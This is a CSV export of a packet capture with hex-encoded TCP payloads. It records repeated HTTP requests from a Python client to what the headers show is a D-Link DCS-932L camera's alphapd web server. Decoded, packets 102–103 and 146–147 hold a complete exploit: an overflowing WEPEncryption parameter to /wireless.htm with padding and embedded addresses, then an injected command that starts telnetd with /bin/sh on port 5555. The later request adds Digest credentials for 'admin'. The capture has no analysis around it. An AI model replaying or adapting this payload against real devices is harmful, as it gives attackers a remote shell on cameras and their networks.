frame.number,frame.time,ip.src,ip.dst,tcp.seq,tcp.payload
"60","Mar  4, 2022 16:23:53.667121000 PST","192.168.0.12","192.168.0.243","38","5365727665723a20616c70686170642f322e312e380d0a446174653a20467269204d61722020342031373a32333a353320323032320d0a507261676d613a206e6f2d63616368650d0a43616368652d436f6e74726f6c3a206e6f2d63616368650d0a"
"61","Mar  4, 2022 16:23:53.667378000 PST","192.168.0.12","192.168.0.243","38","5365727665723a20616c70686170642f322e312e380d0a446174653a20467269204d61722020342031373a32333a353320323032320d0a507261676d613a206e6f2d63616368650d0a43616368652d436f6e74726f6c3a206e6f2d63616368650d0a"
"62","Mar  4, 2022 16:23:53.667378000 PST","192.168.0.243","192.168.0.12","144",
"63","Mar  4, 2022 16:23:53.667379000 PST","192.168.0.243","192.168.0.12","144",
"64","Mar  4, 2022 16:23:53.667379000 PST","192.168.0.243","192.168.0.12","144",
"65","Mar  4, 2022 16:23:53.667379000 PST","192.168.0.243","192.168.0.12","144",
"66","Mar  4, 2022 16:23:53.667822000 PST","192.168.0.12","192.168.0.243","136","436f6e74656e742d747970653a20746578742f68746d6c0d0a436f6e74656e742d6c656e6774683a203130330d0a"
"67","Mar  4, 2022 16:23:53.667823000 PST","192.168.0.12","192.168.0.243","136","436f6e74656e742d747970653a20746578742f68746d6c0d0a436f6e74656e742d6c656e6774683a203130330d0a"
"68","Mar  4, 2022 16:23:53.668079000 PST","192.168.0.243","192.168.0.12","144",
"69","Mar  4, 2022 16:23:53.668079000 PST","192.168.0.243","192.168.0.12","144",
"70","Mar  4, 2022 16:23:53.668079000 PST","192.168.0.243","192.168.0.12","144",
"71","Mar  4, 2022 16:23:53.668079000 PST","192.168.0.243","192.168.0.12","144",
"72","Mar  4, 2022 16:23:53.669391000 PST","192.168.0.12","192.168.0.243","182","5757572d41757468656e7469636174653a20446967657374207265616c6d3d224443532d3933324c42315f4634222c716f703d2261757468222c206e6f6e63653d223161316431303964376636613335656266666534656138353361636633393263220d0a"
"73","Mar  4, 2022 16:23:53.669642000 PST","192.168.0.12","192.168.0.243","182","5757572d41757468656e7469636174653a20446967657374207265616c6d3d224443532d3933324c42315f4634222c716f703d2261757468222c206e6f6e63653d223161316431303964376636613335656266666534656138353361636633393263220d0a"
"74","Mar  4, 2022 16:23:53.669643000 PST","192.168.0.243","192.168.0.12","144",
"75","Mar  4, 2022 16:23:53.669643000 PST","192.168.0.243","192.168.0.12","144",
"76","Mar  4, 2022 16:23:53.669643000 PST","192.168.0.243","192.168.0.12","144",
"77","Mar  4, 2022 16:23:53.669643000 PST","192.168.0.243","192.168.0.12","144",
"78","Mar  4, 2022 16:23:53.669924000 PST","192.168.0.12","192.168.0.243","283","0d0a3c68746d6c3e3c626f64793e3c68323e4572726f723a20417574686f72697a6174696f6e2052657175697265643c2f68323e0d0a3c703e41757468656e7469636174696f6e20776173207265717565737465643c2f703e3c2f626f64793e3c2f68746d6c3e0d0a0d0a"
"79","Mar  4, 2022 16:23:53.669924000 PST","192.168.0.12","192.168.0.243","283","0d0a3c68746d6c3e3c626f64793e3c68323e4572726f723a20417574686f72697a6174696f6e2052657175697265643c2f68323e0d0a3c703e41757468656e7469636174696f6e20776173207265717565737465643c2f703e3c2f626f64793e3c2f68746d6c3e0d0a0d0a"
"80","Mar  4, 2022 16:23:53.670771000 PST","192.168.0.243","192.168.0.12","144",
"81","Mar  4, 2022 16:23:53.670772000 PST","192.168.0.243","192.168.0.12","144",
"82","Mar  4, 2022 16:23:53.671381000 PST","192.168.0.243","192.168.0.12","144",
"83","Mar  4, 2022 16:23:53.671382000 PST","192.168.0.243","192.168.0.12","144",
"84","Mar  4, 2022 16:23:53.671710000 PST","192.168.0.12","192.168.0.243","391",
"85","Mar  4, 2022 16:23:53.671710000 PST","192.168.0.12","192.168.0.243","391",
"86","Mar  4, 2022 16:23:53.671710000 PST","192.168.0.12","192.168.0.243","391",
"87","Mar  4, 2022 16:23:53.671710000 PST","192.168.0.12","192.168.0.243","391",
"88","Mar  4, 2022 16:23:53.671997000 PST","192.168.0.243","192.168.0.12","145",
"89","Mar  4, 2022 16:23:53.671997000 PST","192.168.0.243","192.168.0.12","145",
"90","Mar  4, 2022 16:23:53.671997000 PST","192.168.0.243","192.168.0.12","145",
"91","Mar  4, 2022 16:23:53.671997000 PST","192.168.0.243","192.168.0.12","145",
"92","Mar  4, 2022 16:23:53.672837000 PST","192.168.0.243","192.168.0.12","0",
"93","Mar  4, 2022 16:23:53.672837000 PST","192.168.0.243","192.168.0.12","0",
"94","Mar  4, 2022 16:23:53.673157000 PST","192.168.0.12","192.168.0.243","0",
"95","Mar  4, 2022 16:23:53.673157000 PST","192.168.0.12","192.168.0.243","0",
"96","Mar  4, 2022 16:23:53.673157000 PST","192.168.0.12","192.168.0.243","0",
"97","Mar  4, 2022 16:23:53.673449000 PST","192.168.0.12","192.168.0.243","0",
"98","Mar  4, 2022 16:23:53.673449000 PST","192.168.0.243","192.168.0.12","1",
"99","Mar  4, 2022 16:23:53.673449000 PST","192.168.0.243","192.168.0.12","1",
"100","Mar  4, 2022 16:23:53.673449000 PST","192.168.0.243","192.168.0.12","1",
"101","Mar  4, 2022 16:23:53.673449000 PST","192.168.0.243","192.168.0.12","1",
"102","Mar  4, 2022 16:23:53.674268000 PST","192.168.0.243","192.168.0.12","1","474554202f776972656c6573732e68746d3f574550456e6372797074696f6e3d4141414141414141414141414141414125653025623025626325324141414141414141414141414141414141414141412536302531312562642532414141414142424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424274656c6e657464242537424946532537442d702425374249465325374435353535242537424946532537442d6c242537424946532537442f62696e2f736820485454502f312e310d0a486f73743a203139322e3136382e302e31320d0a557365722d4167656e743a20707974686f6e2d72657175657374732f322e31382e340d0a4163636570742d456e636f64696e673a20677a69702c206465666c6174650d0a4163636570743a202a2f2a0d0a436f6e6e656374696f6e3a206b6565702d616c6976650d0a526566657265723a20687474703a2f2f3139322e3136382e302e31322f77697a6172642e68746d0d0a0d0a"
"103","Mar  4, 2022 16:23:53.674268000 PST","192.168.0.243","192.168.0.12","1","474554202f776972656c6573732e68746d3f574550456e6372797074696f6e3d4141414141414141414141414141414125653025623025626325324141414141414141414141414141414141414141412536302531312562642532414141414142424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424274656c6e657464242537424946532537442d702425374249465325374435353535242537424946532537442d6c242537424946532537442f62696e2f736820485454502f312e310d0a486f73743a203139322e3136382e302e31320d0a557365722d4167656e743a20707974686f6e2d72657175657374732f322e31382e340d0a4163636570742d456e636f64696e673a20677a69702c206465666c6174650d0a4163636570743a202a2f2a0d0a436f6e6e656374696f6e3a206b6565702d616c6976650d0a526566657265723a20687474703a2f2f3139322e3136382e302e31322f77697a6172642e68746d0d0a0d0a"
"104","Mar  4, 2022 16:23:53.674550000 PST","192.168.0.12","192.168.0.243","1",
"105","Mar  4, 2022 16:23:53.674550000 PST","192.168.0.12","192.168.0.243","1",
"106","Mar  4, 2022 16:23:53.674550000 PST","192.168.0.12","192.168.0.243","1",
"107","Mar  4, 2022 16:23:53.674833000 PST","192.168.0.12","192.168.0.243","1",
"108","Mar  4, 2022 16:23:53.729016000 PST","192.168.0.12","192.168.0.243","1","485454502f312e302034303120417574686f72697a6174696f6e2052657175697265640d0a"
"109","Mar  4, 2022 16:23:53.729292000 PST","192.168.0.12","192.168.0.243","1","485454502f312e302034303120417574686f72697a6174696f6e2052657175697265640d0a"
"110","Mar  4, 2022 16:23:53.729293000 PST","192.168.0.243","192.168.0.12","578",
"111","Mar  4, 2022 16:23:53.729293000 PST","192.168.0.243","192.168.0.12","578",
"112","Mar  4, 2022 16:23:53.729293000 PST","192.168.0.243","192.168.0.12","578",
"113","Mar  4, 2022 16:23:53.729293000 PST","192.168.0.243","192.168.0.12","578",
"114","Mar  4, 2022 16:23:53.729812000 PST","192.168.0.12","192.168.0.243","38","5365727665723a20616c70686170642f322e312e380d0a446174653a20467269204d61722020342031373a32333a353320323032320d0a507261676d613a206e6f2d63616368650d0a43616368652d436f6e74726f6c3a206e6f2d63616368650d0a436f6e74656e742d747970653a20746578742f68746d6c0d0a436f6e74656e742d6c656e6774683a203130330d0a"
"115","Mar  4, 2022 16:23:53.730048000 PST","192.168.0.12","192.168.0.243","38","5365727665723a20616c70686170642f322e312e380d0a446174653a20467269204d61722020342031373a32333a353320323032320d0a507261676d613a206e6f2d63616368650d0a43616368652d436f6e74726f6c3a206e6f2d63616368650d0a436f6e74656e742d747970653a20746578742f68746d6c0d0a436f6e74656e742d6c656e6774683a203130330d0a"
"116","Mar  4, 2022 16:23:53.730049000 PST","192.168.0.243","192.168.0.12","578",
"117","Mar  4, 2022 16:23:53.730049000 PST","192.168.0.243","192.168.0.12","578",
"118","Mar  4, 2022 16:23:53.730049000 PST","192.168.0.243","192.168.0.12","578",
"119","Mar  4, 2022 16:23:53.730049000 PST","192.168.0.243","192.168.0.12","578",
"120","Mar  4, 2022 16:23:53.731289000 PST","192.168.0.12","192.168.0.243","182","5757572d41757468656e7469636174653a20446967657374207265616c6d3d224443532d3933324c42315f4634222c716f703d2261757468222c206e6f6e63653d223161316431303964376636613335656266666534656138353361636633393263220d0a"
"121","Mar  4, 2022 16:23:53.731508000 PST","192.168.0.12","192.168.0.243","182","5757572d41757468656e7469636174653a20446967657374207265616c6d3d224443532d3933324c42315f4634222c716f703d2261757468222c206e6f6e63653d223161316431303964376636613335656266666534656138353361636633393263220d0a"
"122","Mar  4, 2022 16:23:53.731508000 PST","192.168.0.243","192.168.0.12","578",
"123","Mar  4, 2022 16:23:53.731508000 PST","192.168.0.243","192.168.0.12","578",
"124","Mar  4, 2022 16:23:53.731508000 PST","192.168.0.243","192.168.0.12","578",
"125","Mar  4, 2022 16:23:53.731508000 PST","192.168.0.243","192.168.0.12","578",
"126","Mar  4, 2022 16:23:53.731993000 PST","192.168.0.12","192.168.0.243","283","0d0a3c68746d6c3e3c626f64793e3c68323e4572726f723a20417574686f72697a6174696f6e2052657175697265643c2f68323e0d0a3c703e41757468656e7469636174696f6e20776173207265717565737465643c2f703e3c2f626f64793e3c2f68746d6c3e0d0a0d0a"
"127","Mar  4, 2022 16:23:53.731993000 PST","192.168.0.12","192.168.0.243","283","0d0a3c68746d6c3e3c626f64793e3c68323e4572726f723a20417574686f72697a6174696f6e2052657175697265643c2f68323e0d0a3c703e41757468656e7469636174696f6e20776173207265717565737465643c2f703e3c2f626f64793e3c2f68746d6c3e0d0a0d0a"
"128","Mar  4, 2022 16:23:53.732266000 PST","192.168.0.243","192.168.0.12","578",
"129","Mar  4, 2022 16:23:53.732267000 PST","192.168.0.243","192.168.0.12","578",
"130","Mar  4, 2022 16:23:53.732986000 PST","192.168.0.243","192.168.0.12","578",
"131","Mar  4, 2022 16:23:53.732986000 PST","192.168.0.243","192.168.0.12","578",
"132","Mar  4, 2022 16:23:53.733254000 PST","192.168.0.12","192.168.0.243","391",
"133","Mar  4, 2022 16:23:53.733254000 PST","192.168.0.12","192.168.0.243","391",
"134","Mar  4, 2022 16:23:53.733254000 PST","192.168.0.12","192.168.0.243","391",
"135","Mar  4, 2022 16:23:53.733254000 PST","192.168.0.12","192.168.0.243","391",
"136","Mar  4, 2022 16:23:53.735393000 PST","192.168.0.243","192.168.0.12","0",
"137","Mar  4, 2022 16:23:53.735393000 PST","192.168.0.243","192.168.0.12","0",
"138","Mar  4, 2022 16:23:53.735827000 PST","192.168.0.12","192.168.0.243","0",
"139","Mar  4, 2022 16:23:53.735827000 PST","192.168.0.12","192.168.0.243","0",
"140","Mar  4, 2022 16:23:53.735827000 PST","192.168.0.12","192.168.0.243","0",
"141","Mar  4, 2022 16:23:53.736136000 PST","192.168.0.12","192.168.0.243","0",
"142","Mar  4, 2022 16:23:53.736136000 PST","192.168.0.243","192.168.0.12","1",
"143","Mar  4, 2022 16:23:53.736136000 PST","192.168.0.243","192.168.0.12","1",
"144","Mar  4, 2022 16:23:53.736136000 PST","192.168.0.243","192.168.0.12","1",
"145","Mar  4, 2022 16:23:53.736136000 PST","192.168.0.243","192.168.0.12","1",
"146","Mar  4, 2022 16:23:53.736580000 PST","192.168.0.243","192.168.0.12","1","474554202f776972656c6573732e68746d3f574550456e6372797074696f6e3d4141414141414141414141414141414125653025623025626325324141414141414141414141414141414141414141412536302531312562642532414141414142424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424274656c6e657464242537424946532537442d702425374249465325374435353535242537424946532537442d6c242537424946532537442f62696e2f736820485454502f312e310d0a486f73743a203139322e3136382e302e31320d0a557365722d4167656e743a20707974686f6e2d72657175657374732f322e31382e340d0a4163636570742d456e636f64696e673a20677a69702c206465666c6174650d0a4163636570743a202a2f2a0d0a436f6e6e656374696f6e3a206b6565702d616c6976650d0a526566657265723a20687474703a2f2f3139322e3136382e302e31322f77697a6172642e68746d0d0a417574686f72697a6174696f6e3a2044696765737420757365726e616d653d2261646d696e222c207265616c6d3d224443532d3933324c42315f4634222c206e6f6e63653d223161316431303964376636613335656266666534656138353361636633393263222c207572693d222f776972656c6573732e68746d3f574550456e6372797074696f6e3d4141414141414141414141414141414125653025623025626325324141414141414141414141414141414141414141412536302531312562642532414141414142424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424274656c6e657464242537424946532537442d702425374249465325374435353535242537424946532537442d6c242537424946532537442f62696e2f7368222c20726573706f6e73653d223637363966643533623265343732363838623964623464313331656231623665222c20716f703d2261757468222c206e633d30303030303030312c20636e6f6e63653d2264663734633737353734326236623739220d0a0d0a"
"147","Mar  4, 2022 16:23:53.736580000 PST","192.168.0.243","192.168.0.12","1","474554202f776972656c6573732e68746d3f574550456e6372797074696f6e3d4141414141414141414141414141414125653025623025626325324141414141414141414141414141414141414141412536302531312562642532414141414142424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424274656c6e657464242537424946532537442d702425374249465325374435353535242537424946532537442d6c242537424946532537442f62696e2f736820485454502f312e310d0a486f73743a203139322e3136382e302e31320d0a557365722d4167656e743a20707974686f6e2d72657175657374732f322e31382e340d0a4163636570742d456e636f64696e673a20677a69702c206465666c6174650d0a4163636570743a202a2f2a0d0a436f6e6e656374696f6e3a206b6565702d616c6976650d0a526566657265723a20687474703a2f2f3139322e3136382e302e31322f77697a6172642e68746d0d0a417574686f72697a6174696f6e3a2044696765737420757365726e616d653d2261646d696e222c207265616c6d3d224443532d3933324c42315f4634222c206e6f6e63653d223161316431303964376636613335656266666534656138353361636633393263222c207572693d222f776972656c6573732e68746d3f574550456e6372797074696f6e3d4141414141414141414141414141414125653025623025626325324141414141414141414141414141414141414141412536302531312562642532414141414142424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424274656c6e657464242537424946532537442d702425374249465325374435353535242537424946532537442d6c242537424946532537442f62696e2f7368222c20726573706f6e73653d223637363966643533623265343732363838623964623464313331656231623665222c20716f703d2261757468222c206e633d30303030303030312c20636e6f6e63653d2264663734633737353734326236623739220d0a0d0a"
"148","Mar  4, 2022 16:23:53.736866000 PST","192.168.0.12","192.168.0.243","1",
"149","Mar  4, 2022 16:23:53.736866000 PST","192.168.0.12","192.168.0.243","1",
"150","Mar  4, 2022 16:23:53.736866000 PST","192.168.0.12","192.168.0.243","1",
"151","Mar  4, 2022 16:23:53.737142000 PST","192.168.0.12","192.168.0.243","1",
"152","Mar  4, 2022 16:23:53.839943000 PST","192.168.0.12","192.168.0.243","1",
"153","Mar  4, 2022 16:23:53.840200000 PST","192.168.0.12","192.168.0.243","1",
"154","Mar  4, 2022 16:23:53.840200000 PST","192.168.0.243","192.168.0.12","1182",
"155","Mar  4, 2022 16:23:53.840200000 PST","192.168.0.243","192.168.0.12","1182",
"156","Mar  4, 2022 16:23:53.840648000 PST","192.168.0.243","192.168.0.12","1182",
"157","Mar  4, 2022 16:23:53.840648000 PST","192.168.0.243","192.168.0.12","1182",
"158","Mar  4, 2022 16:23:53.840928000 PST","192.168.0.12","192.168.0.243","2",
"159","Mar  4, 2022 16:23:53.840928000 PST","192.168.0.12","192.168.0.243","2",
"160","Mar  4, 2022 16:23:53.840928000 PST","192.168.0.12","192.168.0.243","2",
"161","Mar  4, 2022 16:23:53.840928000 PST","192.168.0.12","192.168.0.243","2",
"162","Mar  4, 2022 16:23:53.841201000 PST","192.168.0.243","192.168.0.12","1183",
"163","Mar  4, 2022 16:23:53.841201000 PST","192.168.0.243","192.168.0.12","1183",
"164","Mar  4, 2022 16:23:53.841201000 PST","192.168.0.243","192.168.0.12","1183",
"165","Mar  4, 2022 16:23:53.841201000 PST","192.168.0.243","192.168.0.12","1183",
"167","Mar  4, 2022 16:24:01.132877000 PST","192.168.0.12","54.194.162.61","1","170301002086278af1229fb3d267751d73830a9825dace476b56157d2ff344dd363ca4d56117030100900682b74d3b5fd19b47063f218202907fba0a970d38fd71a411f3a2548f4c77e5218a20978d43787a58049a2d7aa3c927cb63c00c58254383df97500933b8c2078b70ab88e54bb71d54b779b86909a34cb5f22099cc09dd446759e0d5f157f1c95ec35d801da1b924d9f25c770155a8ace00beb6032656a3b9ac23a6014e538390ec826dfd2d4c2f6bd72fdddb131c316"
"168","Mar  4, 2022 16:24:01.133124000 PST","192.168.0.12","54.194.162.61","1","170301002086278af1229fb3d267751d73830a9825dace476b56157d2ff344dd363ca4d56117030100900682b74d3b5fd19b47063f218202907fba0a970d38fd71a411f3a2548f4c77e5218a20978d43787a58049a2d7aa3c927cb63c00c58254383df97500933b8c2078b70ab88e54bb71d54b779b86909a34cb5f22099cc09dd446759e0d5f157f1c95ec35d801da1b924d9f25c770155a8ace00beb6032656a3b9ac23a6014e538390ec826dfd2d4c2f6bd72fdddb131c316"
"169","Mar  4, 2022 16:24:01.279555000 PST","54.194.162.61","192.168.0.12","1",
